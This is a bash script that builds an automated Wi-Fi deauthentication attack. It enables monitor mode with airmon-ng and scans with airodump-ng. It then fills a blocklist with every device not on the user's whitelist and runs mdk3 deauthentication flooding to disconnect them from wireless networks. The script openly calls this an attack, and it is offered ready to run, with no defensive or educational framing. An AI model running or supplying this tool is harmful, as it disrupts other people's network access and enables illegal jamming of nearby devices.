#!/bin/bash

# Set the temporary folder for storing capture files
TEMP_DIR="./temp_capture_files"

# Set the whitelist and blocklist files
WHITELIST="whitelist.txt"
BLOCKLIST="blocklist.txt"

# Ensure the temporary directory exists
if [ ! -d "$TEMP_DIR" ]; then
    mkdir -p "$TEMP_DIR"
    echo "Created temporary folder: $TEMP_DIR"
fi

# Ensure the whitelist file exists
if [ ! -f "$WHITELIST" ]; then
    touch "$WHITELIST"
    echo "Created whitelist file: $WHITELIST"
fi

# Ensure the blocklist file exists
if [ ! -f "$BLOCKLIST" ]; then
    touch "$BLOCKLIST"
    echo "Created blocklist file: $BLOCKLIST"
fi

# Function to validate MAC address format
validate_mac() {
    if ! [[ "$1" =~ ^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$ ]]; then
        echo "Invalid MAC address format: $1. Please try again."
        return 1
    fi
    return 0
}

# Add MAC addresses to the whitelist
while true; do
    echo "Enter the MAC address of the device you want to allow (e.g., 00:11:22:33:44:55):"
    read MAC_ADDRESS

    if validate_mac "$MAC_ADDRESS"; then
        echo "$MAC_ADDRESS" >> "$WHITELIST"
        echo "Added $MAC_ADDRESS to the whitelist."
    fi

    echo "Do you want to add another MAC address? (yes/no)"
    read ADD_MORE
    if [[ "$ADD_MORE" != "yes" ]]; then
        break
    fi
done

# Ask the user if they want to use the whitelist or blocklist
while true; do
    echo "Do you want to use the whitelist or blocklist? (w for whitelist / b for blocklist)"
    read LIST_TYPE

    if [[ "$LIST_TYPE" == "w" || "$LIST_TYPE" == "b" ]]; then
        break
    else
        echo "Invalid input. Please enter 'w' for whitelist or 'b' for blocklist."
    fi
done

# Search for the monitor interface or switch to monitor mode if needed
MONITOR_INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E 'mon|mon[0-9]*')

if [ -z "$MONITOR_INTERFACE" ]; then
    INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E 'wlan[0-9]+')
    
    if [ -z "$INTERFACE" ]; then
        echo "No wireless interfaces found. Exiting."
        exit 1
    fi

    airmon-ng check kill
    if ! airmon-ng start "$INTERFACE"; then
        echo "Error: Failed to switch interface to monitor mode."
        exit 1
    fi

    MONITOR_INTERFACE=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E 'mon|mon[0-9]*')
    
    if [ -z "$MONITOR_INTERFACE" ]; then
        echo "Error: No monitor interface found after activation."
        exit 1
    fi
else
    echo "Found active monitor interface: $MONITOR_INTERFACE"
fi

# Set up cleanup process on exit
trap "rm -f $TEMP_DIR/capture-01.csv $TEMP_DIR/current_capture.csv; airmon-ng stop $MONITOR_INTERFACE; exit" SIGINT

if [[ "$LIST_TYPE" == "b" ]]; then
    # Execute the blocklist attack
    echo "Using blocklist for the attack..."
    while true; do
        airodump-ng --write "$TEMP_DIR/capture" --output-format csv "$MONITOR_INTERFACE" &
        AIRODUMP_PID=$!
        sleep 15
        kill $AIRODUMP_PID

        if [ ! -f "$TEMP_DIR/capture-01.csv" ]; then
            echo "Error: Capture file not found. Retrying in 5 seconds."
            sleep 5
            continue
        fi

        cp "$TEMP_DIR/capture-01.csv" "$TEMP_DIR/current_capture.csv"
        WHITELIST_MACS=$(cat "$WHITELIST")

        for BSSID in $(awk -F',' '/^[0-9]/ {print $1}' "$TEMP_DIR/current_capture.csv" | sort -u); do
            for CLIENT_MAC in $(awk -F',' -v bssid="$BSSID" '$1==bssid {print $1}' "$TEMP_DIR/current_capture.csv"); do
                if ! echo "$WHITELIST_MACS" | grep -q "$CLIENT_MAC"; then
                    if ! grep -q "$CLIENT_MAC" "$BLOCKLIST"; then
                        echo "$CLIENT_MAC" >> "$BLOCKLIST"
                        echo "Added $CLIENT_MAC to the blocklist."
                    fi
                fi
            done
        done

        echo "Network capture and blocklist update completed."
        sleep 15
    done &
    sleep 30
    echo "Starting attack using mdk3..."
    mdk3 "$MONITOR_INTERFACE" d -b "$BLOCKLIST" &
elif [[ "$LIST_TYPE" == "w" ]]; then
    # Execute the whitelist attack
    echo "Using whitelist for the attack..."
    mdk3 "$MONITOR_INTERFACE" d -w "$WHITELIST" | airodump-ng "$MONITOR_INTERFACE"
else
    echo "Invalid option. Exiting."
    exit 1
fi

wait